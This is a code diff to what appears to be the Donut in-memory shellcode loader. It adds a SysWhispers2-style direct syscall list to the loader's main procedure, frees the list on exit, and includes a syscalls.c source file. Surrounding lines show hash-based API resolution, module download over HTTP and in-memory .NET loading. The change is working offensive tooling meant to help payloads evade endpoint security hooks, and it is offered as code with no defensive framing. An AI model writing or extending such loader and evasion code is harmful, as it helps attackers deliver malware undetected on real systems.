@@ -180,6 +180,30 @@ DWORD MainProc(PDONUT_INSTANCE inst) {
         goto erase_memory;
       }
     }
+    
+    // Allocate and populate the syscall list (SysWhispers2 style)
+    DPRINT("Allocating syscall list");
+    PSYSCALL_LIST syscall_list = (PSYSCALL_LIST)_VirtualAlloc(
+        NULL, 
+        sizeof(SYSCALL_LIST), 
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_READWRITE);
+    
+    if(syscall_list == NULL) {
+      DPRINT("Failed to allocate syscall list");
+      goto erase_memory;
+    }
+    
+    DPRINT("Populating syscall list");
+    if(!SW2_PopulateSyscallList(syscall_list)) {
+      DPRINT("Failed to populate syscall list");
+      goto erase_memory;
+    }
+    
+    // Store syscall_list pointer in instance for use by other functions
+    inst->syscall_list = (ULONG_PTR)syscall_list;
+    DPRINT("Syscall list populated with %d entries at %p", syscall_list->Count, syscall_list);
+    
     DPRINT("Resolving LoadLibraryA");
     
     inst->api.addr[0] = xGetProcAddressByHash(inst, inst->api.hash[0], inst->iv);
@@ -357,6 +381,12 @@ erase_memory:
     // should we call RtlExitUserProcess?
     term = (BOOL) (inst->exit_opt == DONUT_OPT_EXIT_PROCESS);
     
+    // Free syscall list if allocated
+    if(inst->syscall_list != 0) {
+      DPRINT("Releasing syscall list memory");
+      _VirtualFree((LPVOID)(ULONG_PTR)inst->syscall_list, 0, MEM_DECOMMIT | MEM_RELEASE);
+    }
+    
     DPRINT("Erasing RW memory for instance");
     Memset(inst, 0, inst->len);
     
@@ -379,6 +409,7 @@ int ansi2unicode(PDONUT_INSTANCE inst, CHAR input[], WCHAR output[DONUT_MAX_NAME
 }
 
 #include "peb.c"             // resolve functions in export table
+#include "syscalls.c"        // SysWhispers2 style direct syscalls
 #include "http_client.c"     // Download module from HTTP server
 //#include "dns_client.c"      // Download module from DNS server
 #include "inmem_dotnet.c"    // .NET assemblies
